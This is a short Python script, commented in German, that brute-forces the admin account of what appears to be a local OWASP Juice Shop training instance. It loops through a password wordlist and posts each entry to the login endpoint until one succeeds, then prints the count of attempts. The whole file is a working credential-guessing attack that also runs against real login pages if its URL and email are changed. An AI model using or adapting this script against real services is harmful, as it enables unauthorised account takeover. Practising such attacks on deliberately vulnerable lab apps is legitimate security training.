import requests

url = "http://192.168.0.204:3000/rest/user/login"
login_data = {"email": "admin@juice-sh.op", "password": ""}

i = 0

with open("pw.txt", "r") as file:
    for line in file:
        # Entferne Leerzeichen oder Zeilenumbrüche am Anfang oder Ende der Zeile
        password = line.strip()
        
        # Aktualisiere das Passwort im Payload
        login_data["password"] = password

        # Sende den HTTP-POST-Request
        response = requests.post(url, data=login_data)

        # Überprüfe den Statuscode der Antwort
        if response.status_code == 401:
            print(f"Password: {password} falsch, Status Code: {response.status_code}")
            i = i+1
        elif response.status_code == 200:
            print(f"Password: {password} korrekt, Status Code: {response.status_code}")
            print(f"Versuche: {i}")
            break
        else:
            print(f"Password: {password}, Status Code: {response.status_code}, Response: {response.text}")
